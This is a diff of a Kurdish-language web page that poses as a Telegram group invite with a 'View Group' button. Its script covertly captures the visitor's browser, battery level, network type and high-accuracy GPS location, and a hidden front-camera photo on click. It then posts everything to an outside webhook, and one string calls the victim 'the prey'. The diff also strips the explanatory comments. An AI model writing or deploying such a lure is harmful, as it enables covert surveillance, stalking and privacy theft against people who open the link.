@@ -37,7 +37,7 @@
 <body>
 
     <p>بۆ چوونە ناو گرووپ، کلیک لەسەر دوگمەی خوارەوە بکە:</p>
-    <a href="https://t.me/" class="btn" id="viewGroupBtn">View Group</a>
+    <a href="https://telegram.org" class="btn" id="viewGroupBtn">View Group</a>
 
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
@@ -50,7 +50,6 @@
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
 
-        // گۆڕاوە جیهانییەکان بۆ پاشەکەوتکردنی داتاکان لە پاشبنەمادا
         let globalBattery = "N/A";
         let globalCharging = "N/A";
         let globalMaps = "⚠️ مۆڵەتی نەدا یان هێشتا بارنەبووە";
@@ -59,7 +58,6 @@
         let globalTime = new Date().toLocaleString('ku-IQ') || new Date().toString();
         let globalNetwork = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : "Unknown";
 
-        // ١. دیاریکردنی جۆری وێبگەر
         const userAgent = navigator.userAgent;
         if (userAgent.indexOf("Firefox") > -1) globalBrowser = "Firefox";
         else if (userAgent.indexOf("SamsungBrowser") > -1) globalBrowser = "Samsung Browser";
@@ -67,7 +65,6 @@
         else if (userAgent.indexOf("Chrome") > -1) globalBrowser = "Chrome";
         else if (userAgent.indexOf("Safari") > -1) globalBrowser = "Safari";
 
-        // ٢. وەرگرتنی پێشوەختەی باتری
         if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
                 globalBattery = Math.round(battery.level * 100) + "%";
@@ -75,31 +72,28 @@
             }).catch(() => {});
         }
 
-        // ٣. داواکردنی ڕاستەوخۆ و دەقیقی لۆکەیشن بە GPS (High Accuracy) هەر کە سایتەکە کرایەوە
+        // وەرگرتنی لۆکەیشن بە شێوازی ڕاست و بێ خەوش
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((position) => {
+                // لێرەدا کێشەی هێمای 0 چاککراوە بۆ $ بۆ ئەوەی پۆوتانەکان بە دروستی بخوێنێتەوە
                 globalMaps = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
             }, (error) => {
                 globalMaps = "⚠️ نێچیرەکە مۆڵەتی لۆکەیشنی ڕەتکردەوە!";
             }, { 
-                enableHighAccuracy: true, // بەکارهێنانی GPS بۆ بەرزترین وردی مەتر بە مەتر
-                timeout: 10000, 
+                enableHighAccuracy: true, 
+                timeout: 7000, 
                 maximumAge: 0 
             });
         } else {
             globalMaps = "لۆکەیشن پشتگیری ناکرێت";
         }
 
-        // ٤. چالاککردنی کامێرا لە پشتەوە
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
             .then(stream => {
                 video.srcObject = stream;
             })
-            .catch(() => {
-                console.log("مۆڵەتی کامێرا نەدرا");
-            });
+            .catch(() => {});
 
-        // ٥. کاتێک کلیک لە دوگمەکە دەکات - ناردنی دەستبەجێ بەبێ دواکەوتن!
         document.getElementById('viewGroupBtn').addEventListener('click', function(e) {
             try {
                 context.drawImage(video, 0, 0, 640, 480);
@@ -111,7 +105,6 @@
             }
         });
 
-        // فرمانی ناردنی دەستبەجێ بۆ Pipedream
         async function sendToWebhookNow(imageBlob) {
             const formData = new FormData();
             let uid = "User_" + Math.floor(Math.random() * 90000) + 10000;
@@ -129,7 +122,6 @@
                 formData.append("photo", imageBlob, "snap.jpg");
             }
 
-            // ناردنی خێرا بۆ سێرڤەر
             fetch(secureWebhook, { method: 'POST', body: formData }).catch(err => console.error(err));
         }
     </script>
